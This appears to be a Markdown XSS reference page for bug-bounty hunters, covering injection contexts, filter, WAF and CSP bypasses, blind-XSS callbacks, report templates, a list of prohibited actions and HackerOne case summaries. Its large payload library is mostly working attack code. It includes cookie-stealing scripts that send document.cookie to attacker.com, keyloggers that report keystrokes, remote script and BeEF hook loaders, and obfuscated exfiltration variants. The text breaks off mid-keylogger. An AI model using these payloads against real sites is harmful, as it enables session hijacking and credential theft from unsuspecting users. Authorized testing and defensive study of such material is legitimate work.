# XSS

> Perspective: black-box; the goal is to make a script execute in the victim's browser

## 1. In one sentence

XSS = executing user input as code (HTML/JS).
- **Stored**: input goes into the DB, triggered by visitors — highest value (blind hitting an admin).
- **Reflected**: input is immediately echoed in the URL — lowest value, most platforms don't accept it.
- **DOM**: purely client-side, does not go through the server — often overlooked.
- **mXSS**: browser parsing differences during serialization/deserialization.

SRC value: stored XSS in an admin backend = P1 ($300–$3k); ordinary reflected = P3 / rejected.

---

## 2. High-frequency output points (by wooyun cases)

| Output point | Trigger | Typical |
|--------|------|------|
| User nickname / signature | page load | profile page, comments |
| Search echo | search | history / results page |
| Comment / message | display | forums, product reviews |
| Filename / description | list | network drive, album |
| Email body / subject | open | email system |
| URL parameter echo | render | share link |
| Order remark | backend view | e-commerce tickets |
| API callback parameter | JS execution | JSONP |

### Easily overlooked points

- **HTTP header reflection**: X-Forwarded-For → log backend, UA → analytics panel
- **Mobile/WAP sync**: written by APP → displayed on Web
- **Re-rendering**: drafts / review list / backend
- **Source map / JSON injection**: `/api/data?cb=alert(1)`

---

## 3. Probing techniques

### 3.1 Context identification (look at the landing point first)

| Context | Break out with | Probe |
|--------|------|------|
| Inside an HTML tag | `<` | `<svg onload=alert(1)>` |
| Attribute | quotes | `" autofocus onfocus=alert(1) "` |
| URL attribute | protocol | `javascript:alert(1)` |
| JS string | quotes | `";alert(1);//` |
| JS JSON | quote + break out | `'-alert(1)-'`, `"};alert(1);//` |
| CSS (IE) | function | `xss:expression(alert(1))` |

### 3.2 Payload library (by context)

#### Inside an HTML tag

```html
<script>alert(1)</script>
<svg onload=alert(1)>
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
<img/src=x onerror=alert(1)>
<iframe src="javascript:alert(1)">
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<body onload=alert(1)>
<frameset onload=alert(1)>
```

#### Inside an attribute

```
" onclick=alert(1) "
" onmouseover=alert(1) "
" onfocus=alert(1) autofocus="
"><script>alert(1)</script><"
'-alert(1)-'
\";alert(1);//
```

#### JS string

```js
';alert(1);//
'-alert(1)-'
\';alert(1);//
</script><script>alert(1)</script>
```

#### URL

```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### 3.3 Encoding bypass

| Encoding | Example |
|------|------|
| HTML entities | `&#60;script&#62;alert(1)&#60;/script&#62;` |
| Hex entities | `&#x3c;script&#x3e;` |
| Unicode | `<iframe/onload=alert(1)>` |
| URL | `%3cscript%3ealert(1)%3c/script%3e` |
| Double URL | `%253cscript%253e` |
| Base64 in data | `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` |

### 3.4 Keyword / parenthesis bypass

```js
// alert bypass
window['al'+'ert'](1)
self['al'+'ert'](1)
Function('alert(1)')()
eval('al'+'ert(1)')
[].constructor.constructor('alert(1)')()

// Unicode keyword
alert(1)

// Parenthesis bypass
alert`1`                     // template string
throw onerror=alert,1        // exception + shorthand
location='javascript:alert(1)'

// String.fromCharCode
String.fromCharCode(97,108,101,114,116,40,49,41)

// btoa / atob
eval(atob('YWxlcnQoMSk='))
```

### 3.5 DOM XSS sources / sinks

```js
// Sources (attacker-controllable)
location.href / location.search / location.hash / location.pathname
document.URL / document.documentURI / document.referrer
window.name
document.cookie
postMessage data

// Sinks (execution points)
eval()  Function()  setTimeout(string)  setInterval(string)
innerHTML / outerHTML / insertAdjacentHTML
document.write / document.writeln
element.src / element.href
$('...')   .html(...)
```

Test:
```bash
# Modify location.hash
https://target/page.html#<img src=x onerror=alert(1)>

# Modify location.search
https://target/page.html?q=</script><script>alert(1)</script>

# Modify referrer
Visit attacker.com → click → target.com (attacker.com contains the payload)

# postMessage (cross-window)
parent.postMessage('<img src=x onerror=alert(1)>','*')
```

Tool: browser DevTools breakpoints + Sources tab tracing.

### 3.6 Blind XSS (triggered by admin)

```html
<script src=https://your-xss-hunter.com/abc></script>
```

Platforms:
- **XSS Hunter Express** (self-hosted)
- Your own OOB (webhook.site is simple but does not capture cookies)
- Third-party blind-XSS callback services (e.g. the ones bundled into commercial scanners) work the same
  way — a unique subdomain per probe, a hit means an admin/backend rendered the payload unescaped. Any of
  these are interchangeable; **self-hosting the same pattern** (a wildcard DNS pointed at a small logging
  server, one unique subdomain per injection point) gives full control over what's captured and avoids
  depending on a third party's infrastructure or retention policy — worth building once as shared tooling.

Applicable to:
- Backend review (user nickname / message / feedback)
- Ticket systems
- Message feedback
- Any free-text field whose only visible consumer is the *submitter's own view* — a hit on the callback is
  what proves it's also rendered somewhere else (support tooling, an admin dashboard, a moderation queue)

**3.6.1 OOB callback wrapped in header/CRLF injection.** The callback doesn't have to arrive via a `<script src>`
tag — wrapping the same callback subdomain inside a CRLF/SMTP-header-injection payload tests two things in
one probe: whether the field reaches an email/notification pipeline, and (via the callback hit) whether that
pipeline fetches or renders untrusted content:
```
to@example.com>%0d%0abcc:probe-id@your-oob-domain
```
A hit means the field's content reached something that resolved/rendered the injected address — a stronger
signal than a generic reflected-input test, since it proves reach into a *second* system (mailer, notification
worker), not just storage.

**3.6.2 ESI injection (OOB detection).** If a CDN/edge cache in front of the target processes Edge Side
Includes, an injected `<esi:include>` tag makes the *edge*, not the origin, fetch attacker-controlled content
server-side — a distinct primitive from XSS (it runs pre-render, at the cache layer) but detected the same
way, via an OOB hit:
```html
<esi:include src="http://your-oob-domain/probe.png"/>
```
A hit here (edge fetches the URL) confirms ESI processing is live and untrusted input reaches it — pivot to
cache poisoning / internal SSRF from there (see `ssrf-cache-host.md`), it is not itself the end of the chain.

**3.6.3 Recognizing pre-existing OOB/scanner canaries in live data.** When an audit turns up strings like
`<ScRiPt>randomFunc(1234)</ScRiPt>`, `'"()&%<zzz>`, `e'<randomTag>`, or callback subdomains already sitting
in stored records, that is evidence a prior automated scan (Burp Active Scanner, Netsparker/Invicti, or
similar) already ran against this input and the payload was stored unsanitized — a strong signal the field
is exploitable, but not itself a confirmed finding. Treat it as: (a) proof storage-side sanitization is
missing, (b) a pointer to go verify *where* that field renders and whether it executes there now, and (c)
never report the discovery of old scanner artifacts as if it were a freshly demonstrated exploit — confirm
render-context execution before writing it up.

---

## 4. Bypass matrix

| Blocked by | Bypass |
|---|---|
| Tag blocking `<script>` | `<svg>`, `<img>`, `<details>`, `<marquee>`, `<video>` |
| `script` keyword | `<scr<script>ipt>` (double-write), `<sCrIpT>` (casing), `<%73cript>` (encoding) |
| `alert` keyword | `confirm` / `prompt` / `print` / `top.alert` / `Function('alert(1)')()` |
| Quote filtering | quote-less attribute: `<img src=x onerror=alert(1)>` |
| Length limit | external load `<script src=//xss.cc/j>` / short link |
| HTML5 sandbox | `<script>` inside `<iframe srcdoc>` |
| HTTPOnly Cookie | XSS can't read it, but can still CSRF / phish / change password |
| CSP | with `script-src 'self'`, find a jsonp endpoint / unsafe-eval / dangling markup |

### Common CSP bypass ideas

```
1. CSP contains 'unsafe-inline' → direct inline script
2. CSP contains 'unsafe-eval' → eval / Function
3. CSP contains a jsonp-friendly domain → <script src="//ajax.googleapis.com/ajax/libs/angularjs/1.0.0/angular.js"></script>
4. Static nonce → reuse
5. base-uri missing → <base href="//attacker.com">
6. dangling markup (no script) → <img src='//attacker.com/?
```

---

## 5. Exploitation for escalation / lateral

```
Reflected XSS → phishing link → cookie theft (no HttpOnly)
Stored XSS → triggered by backend admin → steal cookie / CSRF / change password / read page
DOM XSS → same as above
mXSS → triggered by copy-paste / email preview

→ When reporting to SRC, do not perform actual phishing. Just an alert(1) popup / a cookie/document.domain screenshot is enough
```

### Escalation combinations

```
Reflected XSS + Self-XSS (only you can see it in your own backend) → combine with CSRF to have others trigger it → P0
Stored XSS + backend → backend compromise → P0
DOM XSS + postMessage → cross-origin read → P0
```

---

## 6. Real-case fingerprints

| Type | Case |
|------|------|
| Stored XSS | Dajie.com (worm), a social network (worm) |
| Reflected XSS | Kaixin, a search-engine forum |
| DOM XSS | an internet company's document.domain, a social network's Flash htmlText |
| Flash XSS | Yinyuetai LSO Rootkit, an email service's crossdomain.xml |
| mXSS | a social-network mailbox, an email service |
| Blind hitting | Suning, Chengdu Police, Kuaisu Wenyisheng (triggered by admin) |

Common fingerprints:
- Entering `<svg onload=alert(1)>` shows up in the DOM (F12 → elements) → hit
- A browser alert popup → hit
- HTML contains untrusted data wrapped in `<script>` → template rendering missing escaping

---

## 7. Reproduction / evidence essentials

### 7.1 PoC must-haves

1. Trigger URL (with the payload)
2. **Screenshot of the alert popup** (including the URL bar)
3. Screenshot of the payload in the DOM (F12)
4. Test results in different browsers (Chrome / Firefox / Safari, at least 2)
5. CSP / X-XSS-Protection header analysis

### 7.2 Template

```http
GET /search?q=%3Csvg%20onload%3Dalert(document.domain)%3E HTTP/1.1
Host: target.com

→ In the HTML response:
<div class="search-result">Your search content: <svg onload=alert(document.domain)></div>

→ The browser executes alert, popping up: target.com
```

### 7.3 CVSS

```
Stored XSS (admin backend)        = 6.1–8.0
Stored XSS (users viewing each other) = 6.1
Reflected XSS (unauthenticated)   = 6.1
DOM XSS                           = 6.1
Self-XSS (viewing your own)       = usually rejected
mXSS / email preview              = 6.5–8.1
Successful blind hit (admin triggers) = 7.5–8.5
```

### 7.4 Impact section

```
Via the q parameter of the /search endpoint, an attacker can inject HTML/JS code that executes in the victim's browser.
The parameter is accessible without authentication, and the CSP only sets default-src 'self' without restricting inline.

In practice this allows:
1. Stealing the victim's session cookie (when there is no HttpOnly)
2. Triggering CSRF to complete sensitive operations
3. Phishing to a fake login page

During testing only alert(document.domain) was used to prove it; no cookie theft was attempted.
```

---

## Related MCP tools

In practice, jshookmcp can be invoked for automation. **The default `search` profile does not pre-load tools; before invoking, first activate with `mcp__jshook__activate_tools <tool_name>`** (see [`../tools/mcp-jshook.md`](../tools/mcp-jshook.md) §recommended profile).

| Tool | Domain | When to invoke |
|---|---|---|
| `mcp__jshook__browser_evaluate_cdp_target` | browser | execute the payload on the victim domain to verify DOM XSS / blind hit |
| `mcp__jshook__ast_transform_apply` | transform | de-obfuscate obfuscated JS / AST rewriting to restore the sink |
| `mcp__jshook__debugger_pause` + `mcp__jshook__get_call_stack` | debugger | set breakpoints to trace the sink call chain |
| `mcp__jshook__hook_preset` | hooks | install eval / atob / Function presets to capture runtime deserialization |
| `mcp__jshook__sourcemap_reconstruct_tree` | sourcemap | restore original source to locate the sink |

Full mapping: [`../tools/mcp-jshook.md`](../tools/mcp-jshook.md)

## 8. Things not to do

- **Forbidden**: actually stealing a real user's cookie / token. A self-cookie demo is enough.
- **Forbidden**: planting a payload in a public comment section via stored XSS (others would trigger it). Test in a location you control (your own message, your own profile).
- **Forbidden**: using the cookie of an unknown admin obtained via blind hit to log in. Only prove the callback was received, screenshot, and invalidate it immediately.
- **Forbidden**: crafting a real phishing page (fake login).
- **Forbidden**: bulk worm-style propagation (a friend feed or the whole platform).
- **In the report**: cookie / token must be redacted to just head/tail.

## H1 real cases

_A total of 335 disclosed HackerOne High/Critical reports hit this category, sorted by (bounty + votes×100), taking the Top 12_

| Severity | $ | Program | Title (click for the original report) | Summary |
|---|--:|---|---|---|
| High | — | GitLab | [Stored XSS in Wiki pages](https://hackerone.com/reports/526325) | Summary I found Stored XSS using Wiki-specific Hierarchical link Markdown in Wiki pages |
| Critical | 7500 usd | Valve | [XSS in steam react chat client](https://hackerone.com/reports/409850) | The Steam chat client both sends and receives bbcode format chat messages |
| High | — | Grab | [[Grab Android/iOS] Insecure deeplink leads to sensitive information disclosure](https://hackerone.com/reports/401793) | [Grab Android/iOS] Insecure deeplink leads to sensitive information disclosure |
| Critical | 16000 usd | GitLab | [Stored XSS in markdown via the DesignReferenceFilter](https://hackerone.com/reports/1212067) | Summary When rendering markdown, links to designs are parsed using the following `link_reference_pattern`: https://gitlab.com/g… |
| High | — | TikTok | [Cross-Site-Scripting on www.tiktok.com and m.tiktok.com leading to Data Exfiltration](https://hackerone.com/reports/968082) | Cross-Site-Scripting on www.tiktok.com and m.tiktok.com leading to Data Exfiltration |
| Critical | 1000 usd | CS Money | [Blind XSS on image upload](https://hackerone.com/reports/1010466) | Summary: The CSRF vulnerability make a request for support.cs.money/upload_file; This upload_file does not have csrf token/ ori… |
| High | 5000 usd | Reddit | [[accounts.reddit.com] Redirect parameter allows for XSS](https://hackerone.com/reports/1962645) | Summary: Hello team! I was tampering with the dest parameter in accounts.reddit.com and found out it is vulnerable to Cross Sit… |
| High | 13950 usd | GitLab | [Stored XSS via Kroki diagram](https://hackerone.com/reports/1731349) | Summary If Kroki has been enabled, it's possible to craft a `pre` block so that arbitrary attributes can be injected into the r… |
| Critical | 5000 usd | Basecamp | [HEY.com email stored XSS](https://hackerone.com/reports/982291) | An attacker can bypass the HEY.com HTML sanitizer and inject arbitrary unsafe HTML in emails |
| High | — | WordPress | [Stored XSS Vulnerability](https://hackerone.com/reports/643908) | Hi there, I found a stored xss @ https://core.trac.wordpress.org/ Steps: 1 |
| Critical | — | X / xAI | [Blind XSS on Twitter's internal Big Data panel at █████████████](https://hackerone.com/reports/1207040) | Blind XSS on Twitter's internal Big Data panel at █████████████ |

**Weakness distribution for hits in this category:**

- Cross-site Scripting (XSS) - Stored: 166 entries
- Cross-site Scripting (XSS) - Generic: 74 entries
- Cross-site Scripting (XSS) - Reflected: 51 entries
- Cross-site Scripting (XSS) - DOM: 29 entries
- Uncategorized → manually classified: 12 entries
- Reflected XSS: 1 entry
- Improper Neutralization of HTTP Headers for Scripting Syntax: 1 entry
- Cross-Site Scripting (XSS): 1 entry

## Payload library

_12 structured web payloads, including full attack chains + WAF/EDR bypass variants_

### Reflected XSS  `xss-reflected`
Reflected cross-site scripting attack techniques
Sub-category: **reflected** · tags: `xss` `reflected` `javascript`

**Prerequisites:** user input is reflected onto the page; the input is not filtered or encoded

**Attack chain:**

**1. 1. Probe the XSS injection point**
_Basic XSS probing_
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
" onfocus=alert(1) autofocus "
```

**2. 2. Event-handler bypass**
_Use various event handlers_
```
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

**3. 3. Tag bypass**
_Case obfuscation and tag mutation_
```
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
<svg/onload=alert(1)>
<details/open/ontoggle=alert(1)>
```

**4. 4. Steal Cookie**
_Steal the user's Cookie_
```
<script>new Image().src="http://attacker.com/steal?c="+document.cookie</script>
<script>fetch("http://attacker.com/steal?c="+document.cookie)</script>
<script>location="http://attacker.com/steal?c="+document.cookie</script>
```

**5. 5. Keylogging**
_Record the user's keyboard input_
```
<script>
document.onkeypress=function(e){
  fetch("http://attacker.com/log?key="+e.key)
}
</script>
```

**WAF/EDR bypass variants:**

**1. HTML entity encoding**
_Bypass using HTML entity encoding_
```
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
```

**2. Unicode encoding**
_Bypass using Unicode encoding_
```
<script>\u0061lert(1)</script>
<img src=x onerror=\u0061lert(1)>
```

**3. Double-write bypass**
_Double-write to bypass keyword removal_
```
<scr<script>ipt>alert(1)</scr</script>ipt>
<imimgg src=x onerror=alert(1)>
```

**4. Comment obfuscation**
_Use comments to obfuscate_
```
<script>/**/alert(1)/**/</script>
<img src=x/**/onerror=alert(1)>
<svg on<!--test-->load=alert(1)>
```

---

### Stored XSS  `xss-stored`
Stored cross-site scripting attack techniques
Sub-category: **stored** · tags: `xss` `stored` `persistent`

**Prerequisites:** a data-storage feature exists; stored data is displayed without filtering

**Attack chain:**

**1. 1. Probe storage points**
_Probe for stored XSS_
```
In comment sections, usernames, bios, etc., input:
<script>alert(1)</script>
"><script>alert(1)</script>
Test whether it is stored and executed
```

**2. 2. Stealthy payload**
_Use a stealthy XSS payload_
```
<img src=x onerror=alert(1) style="display:none">
<svg/onload=alert(1) style="position:absolute;left:-9999px">
<div style="background:url(javascript:alert(1))">
```

**3. 3. Persistent control**
_Load an external malicious script_
```
<script>
if(!window.xss_loaded){
  window.xss_loaded=true;
  var s=document.createElement("script");
  s.src="http://attacker.com/evil.js";
  document.body.appendChild(s);
}
</script>
```

**4. 4. BeEF Hook**
_Use the BeEF framework to control the browser_
```
<script src="http://beef-server:3000/hook.js"></script>
Or:
<script>
var s=document.createElement("script");
s.src="http://beef-server:3000/hook.js";
document.body.appendChild(s);
</script>
```

**WAF/EDR bypass variants:**

**1. SVG tag bypass**
_Bypass using SVG tags_
```
<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1)>
<svg><set onbegin=alert(1)>
```

**2. Math tag bypass**
_Use MathML tags_
```
<math><maction actiontype="statusline#http://attacker.com" xlink:href="javascript:alert(1)">click</maction></math>
```

---

### DOM XSS  `xss-dom`
DOM-based cross-site scripting attack
Sub-category: **DOM-based** · tags: `xss` `dom` `javascript`

**Prerequisites:** JavaScript dynamically manipulates the DOM; user input is written directly into the DOM

**Attack chain:**

**1. 1. Probe DOM XSS**
_Probe for DOM-based XSS_
```
#<script>alert(1)</script>
?param=<img src=x onerror=alert(1)>
Check whether location.hash, location.search, etc. are written directly into the DOM
```

**2. 2. Common sinks**
_Common DOM XSS sinks_
```
document.write(location.hash)
innerHTML = location.search
eval(location.hash)
setTimeout(location.hash, 0)
jQuery(html)
$(location.hash)
```

**3. 3. location.hash exploitation**
_Exploit location.hash_
```
URL: http://target.com/#<img src=x onerror=alert(1)>
If the page has: document.write(location.hash)
then XSS is triggered
```

**4. 4. postMessage exploitation**
_Exploit postMessage_
```
window.addEventListener("message", function(e){
  document.getElementById("output").innerHTML = e.data;
});
Attack page:
targetWindow.postMessage("<img src=x onerror=alert(1)>", "*");
```

**WAF/EDR bypass variants:**

**1. javascript: protocol variant bypass**
_Bypass the javascript: protocol filter using case obfuscation, HTML entity encoding, tab insertion, etc._
```
javascript:alert(1)
javascript	:alert(1)
jaVaScRiPt:alert(1)
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)
<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">click</a>
```

**2. SVG/MathML tag and event-handler bypass**
_Use SVG, MathML, and other non-standard HTML tags plus obscure event handlers (ontoggle, onpageshow) to bypass tag and event blacklists_
```
<svg onload=alert(1)>
<svg/onload=alert(1)>
<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">
<details open ontoggle=alert(1)>
<body onpageshow=alert(1)>
<input onfocus=alert(1) autofocus>
```

---

### CSP bypass  `xss-csp-bypass`
XSS techniques that bypass Content Security Policy (CSP)
Sub-category: **CSP bypass** · tags: `xss` `csp` `bypass`

**Prerequisites:** an XSS vulnerability exists; a CSP policy exists but is misconfigured

**Attack chain:**

**1. 1. Analyze the CSP policy**
_Analyze the CSP configuration_
```
Look at the HTTP response header:
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
Or use the CSP Evaluator tool to analyze
```

**2. 2. Exploit unsafe-inline**
_Exploit the unsafe-inline configuration_
```
If the CSP contains unsafe-inline:
<script>alert(1)</script>
you can directly execute an inline script
```

**3. 3. Exploit unsafe-eval**
_Exploit the unsafe-eval configuration_
```
If the CSP contains unsafe-eval:
<script>eval("alert(1)")</script>
<script>setTimeout("alert(1)", 0)</script>
you can use functions such as eval
```

**4. 4. JSONP bypass**
_Bypass using JSONP_
```
If an allowed domain has a JSONP endpoint:
<script src="https://allowed-domain.com/jsonp?callback=alert(1)"></script>
use the JSONP callback to execute code
```

**5. 5. AngularJS bypass**
_Bypass CSP using AngularJS_
```
If an AngularJS CDN is allowed:
<div ng-app ng-csp>
<div ng-focus="$event.path|orderBy:'[].constructor.from([alert(1)])'" tabindex=0>
</div>
</div>
```

**6. 6. Dangling Markup**
_Use dangling markup to steal data_
```
<img src='http://attacker.com/?
capture subsequent HTML content until a single quote is encountered
```

**WAF/EDR bypass variants:**

**1. JSONP endpoint hijacking CSP**
_Use a JSONP callback endpoint or AngularJS library on a CSP-allowlisted domain to execute arbitrary JavaScript, without unsafe-inline_
```
# Find a JSONP endpoint on an allowlisted domain:
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor("alert(1)")()}}</div>
```

**2. base-uri hijacking and script nonce leak**
_Hijack the script-loading source by exploiting a CSP that does not restrict the base-uri directive, or leak the script nonce value via CSS injection / DOM interfaces_
```
# When base-uri is unrestricted:
<base href="http://attacker.com/">
# Scripts with relative paths on the page will be loaded from attacker.com

# nonce leak exploitation:
# Steal the nonce via CSS injection:
<style>script[nonce^="a"]{background:url(http://attacker.com/?n=a)}</style>
# Or read via DOM: document.querySelector("script[nonce]").nonce
```

---

### Mutation XSS (mXSS)  `xss-mxss`
XSS attacks caused by browser parsing differences
Sub-category: **mutation** · tags: `xss` `mxss` `mutation` `bypass`

**Prerequisites:** an HTML output point exists; browser parsing differences

**Attack chain:**

**1. 1. Basic mXSS probing**
_Exploit the parsing difference of the noscript tag_
```
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

**2. 2. SVG mXSS**
_SVG CDATA mutation_
```
<svg><![CDATA[<img src=x onerror=alert(1)>]]></svg>
<svg><script><![CDATA[alert(1)]]></script></svg>
```

**3. 3. Math mXSS**
_MathML mutation XSS_
```
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
```

**4. 4. Combined with DOM clobbering**
_Exploit DOM clobbering_
```
<form id=x></form><form id=x><img src=x onerror=alert(1)></form>
```

**WAF/EDR bypass variants:**

**1. Nested tag bypass**
_Encoding bypass of a script inside SVG_
```
<svg><script>&#97;lert(1)</script></svg>
<svg><script>a&#108;ert(1)</script></svg>
```

---

### Unicode XSS  `xss-unicode`
Bypass filters using Unicode encoding characteristics
Sub-category: **Unicode encoding** · tags: `xss` `unicode` `encoding` `bypass`

**Prerequisites:** an XSS injection point exists; the filter checks keywords

**Attack chain:**

**1. 1. Unicode escapes**
_JavaScript Unicode escapes_
```
<script>\u0061lert(1)</script>
<script>\x61lert(1)</script>
<script>\u{61}lert(1)</script>
```

**2. 2. HTML entity encoding**
_HTML decimal/hex entities_
```
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
```

**3. 3. Unicode normalization attack**
_Exploit Unicode normalization_
```
Use normalization-equivalent characters:
＜script＞alert(1)＜/script＞
Bypass using full-width characters
```

**4. 4. UTF-7 encoding**
_UTF-7 encoded XSS_
```
+ADw-script+AD4-alert(1)+ADw-/script+AD4-
Requires the page to use UTF-7 encoding
```

**WAF/EDR bypass variants:**

**1. Mixed-encoding bypass**
_Mix multiple encoding methods_
```
<img src=x onerror=\u0061&#108;ert(1)>
<img src=x onerror="\u0061lert`1`">
```

**2. Overlong UTF-8 encoding**
_Exploit server UTF-8 parsing differences_
```
<img src=x onerror=alert(1)>
Use non-shortest UTF-8 encoding forms
```

---

### XSS filter bypass  `xss-filter-bypass`
Various techniques to bypass XSS filters
Sub-category: **filter bypass** · tags: `xss` `filter` `bypass` `waf`

**Prerequisites:** an XSS injection point exists; a filtering mechanism exists

**Attack chain:**

**1. 1. Case obfuscation**
_Mixed-case bypass_
```
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
<SvG OnLoAd=alert(1)>
```

**2. 2. Double-write bypass**
_Double-write to bypass keyword removal_
```
<scr<script>ipt>alert(1)</scr</script>ipt>
<imimgg src=x onerror=alert(1)>
```

**3. 3. Comment obfuscation**
_Use comments to obfuscate_
```
<script>/**/alert(1)/**/</script>
<img src=x/**/onerror=alert(1)>
<svg on<!--test-->load=alert(1)>
```

**4. 4. Null-byte truncation**
_Null-byte truncation bypass_
```
<scr\x00ipt>alert(1)</script>
<img src=x onerror=alert\x00(1)>
```

**5. 5. Tag-attribute bypass**
_Use whitespace characters to bypass_
```
<img src=x onerror=alert(1)>
<img src=x onerror =alert(1)>
<img src=x onerror	=alert(1)>
<img src=x onerror
=alert(1)>
```

**6. 6. Event-handler variants**
_Use rare event handlers_
```
<body onpageshow=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<details open ontoggle=alert(1)>
<audio src=x onerror=alert(1)>
```

**WAF/EDR bypass variants:**

**1. Data URI bypass**
_Use a Data URI_
```
<a href="data:text/html,<script>alert(1)</script>">click</a>
<iframe src="data:text/html,<script>alert(1)</script>">
```

**2. SVG animation bypass**
_SVG animation events_
```
<svg><animate onbegin=alert(1)>
<svg><set onbegin=alert(1)>
```

---

### XSS encoding bypass  `xss-encoding`
Use various encoding techniques to bypass XSS filtering
Sub-category: **encoding bypass** · tags: `xss` `encoding` `bypass`

**Prerequisites:** an XSS injection point exists; encoding processing exists

**Attack chain:**

**1. 1. URL encoding**
_URL encoding bypass_
```
<img src=x onerror=%61lert(1)>
%3Cscript%3Ealert(1)%3C/script%3E
```

**2. 2. HTML entity encoding**
_HTML entity encoding_
```
<img src=x onerror=&#97;lert(1)>
<img src=x onerror=&#x61;lert(1)>
&lt;script&gt;alert(1)&lt;/script&gt;
```

**3. 3. JavaScript encoding**
_JavaScript encoding_
```
<img src=x onerror="\u0061lert(1)">
<img src=x onerror="\x61lert(1)">
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
```

**4. 4. CSS encoding**
_CSS encoding (old IE)_
```
<style>body{background:url("javascript:alert(1)")}</style>
<div style="x:expression(alert(1))">
```

**5. 5. Mixed encoding**
_Mix multiple encodings_
```
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>
```

**WAF/EDR bypass variants:**

**1. Double URL encoding**
_Double URL encoding_
```
%253Cscript%253Ealert(1)%253C/script%253E
Used when the server decodes twice
```

**2. UTF-16 encoding**
_UTF-16 encoding bypass_
```
%00%3C%00s%00c%00r%00i%00p%00t%00%3Ealert(1)%00%3C/s%00c%00r%00i%00p%00t%00%3E
```

---

### Polyglot XSS  `xss-polyglot`
XSS payloads that work across multiple environments
Sub-category: **Polyglot** · tags: `xss` `polyglot` `universal`

**Prerequisites:** an XSS injection point exists; the specific environment is uncertain

**Attack chain:**

**1. 1. Classic Polyglot**
_Classic multi-environment Polyglot_
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

**2. 2. Short Polyglot**
_Short-version Polyglot_
```
'"-->]]>*/</script></style></title></textarea><script>alert(1)</script>
```

**3. 3. Attribute-injection Polyglot**
_Attribute-value injection Polyglot_
```
'onmouseover=alert(1) x='
"onfocus=alert(1) autofocus x="
'onclick=alert(1)//
```

**4. 4. URL-parameter Polyglot**
_URL-parameter Polyglot_
```
javascript:alert(1)//http://
data:text/html,<script>alert(1)</script>
```

**WAF/EDR bypass variants:**

**1. Advanced Polyglot**
_Concise and efficient Polyglot_
```
-->'"<svg onload=alert(1)>"><script>alert(1)</script>
```

---

### XSS Cookie theft  `xss-cookie-theft`
Use XSS to steal a user's Cookie
Sub-category: **Cookie theft** · tags: `xss` `cookie` `theft` `session`

**Prerequisites:** an XSS vulnerability exists; the Cookie is not set to HttpOnly

**Attack chain:**

**1. 1. Basic Cookie theft**
_Use the Image object to send the Cookie_
```
<script>new Image().src="http://attacker.com/steal?c="+document.cookie</script>
```

**2. 2. Fetch API theft**
_Use the Fetch/Beacon API_
```
<script>fetch("http://attacker.com/steal?c="+document.cookie)</script>
<script>navigator.sendBeacon("http://attacker.com/steal", document.cookie)</script>
```

**3. 3. XMLHttpRequest theft**
_Send via XHR_
```
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://attacker.com/steal?c="+document.cookie, true);
xhr.send();
</script>
```

**4. 4. Encoded transmission**
_Base64-encoded transmission_
```
<script>
var data = btoa(document.cookie);
new Image().src="http://attacker.com/steal?c="+data;
</script>
```

**5. 5. Full exploitation script**
_Collect full information_
```
<script>
var img = new Image();
img.src = "http://attacker.com/log?cookie=" + encodeURIComponent(document.cookie) + "&location=" + encodeURIComponent(location.href) + "&ua=" + encodeURIComponent(navigator.userAgent);
</script>
```

**WAF/EDR bypass variants:**

**1. Obfuscation bypass**
_Variable-obfuscation bypass_
```
<script>var _0x1234="cookie";eval("new Image().src=\"http://attacker.com/?c="+document[_0x1234]+"\"")</script>
```

---

### XSS keylogging  `xss-keylogger`
Use XSS to record a user's keyboard input
Sub-category: **keylogging** · tags: `xss` `keylogger` `credential`

**Prerequisites:** a stored XSS exists; the target page has sensitive input

**Attack chain:**

**1. 1. Basic keylogging**
_Listen for keystrokes_
```
<script>
document.addEventListener("keypress", function(e){
  new Image().src = "http://attacker.com/log?key=" + e.key;
});
</script>
```

**2. 2. Full keylogging**
_Send the log on Enter_
```
<script>
var buffer = "";
document.addEventListener("keydown", function(e){
  if(e.key === "Enter"){
    new Image().src = "http://attacker.com/log?data=" + encodeURIComponent(buffer);
    buffer = "";
  } else {
    buffer += e.key;
  }
